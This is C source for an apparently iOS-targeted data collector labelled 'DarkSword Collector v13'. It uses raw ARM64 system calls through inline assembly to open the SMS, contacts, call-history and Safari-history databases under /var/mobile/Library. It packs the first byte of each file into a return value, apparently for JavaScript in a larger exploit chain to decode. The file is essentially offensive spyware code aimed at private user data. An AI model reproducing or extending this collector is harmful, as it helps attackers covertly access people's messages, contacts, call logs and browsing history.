/**
 * DarkSword Collector v13 - Read first 4 bytes of each file
 * Encodes results in return value for JS to decode
 * Return value: 
 *   bits 0-7:   SMS db first byte (0x53='S' means SQLite)
 *   bits 8-15:  Contacts db first byte
 *   bits 16-23: CallHistory db first byte
 *   bits 24-31: Safari db first byte
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

static unsigned char _read_first_byte(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;
    unsigned char buf[4];
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);
    if (n < 1) return 0;
    return buf[0];
}

int ds_start(void) {
    unsigned char sms = _read_first_byte("/var/mobile/Library/SMS/sms.db");
    unsigned char contacts = _read_first_byte("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
    unsigned char calls = _read_first_byte("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
    unsigned char safari = _read_first_byte("/var/mobile/Library/Safari/History.db");

    return (int)sms | ((int)contacts << 8) | ((int)calls << 16) | ((int)safari << 24);
}
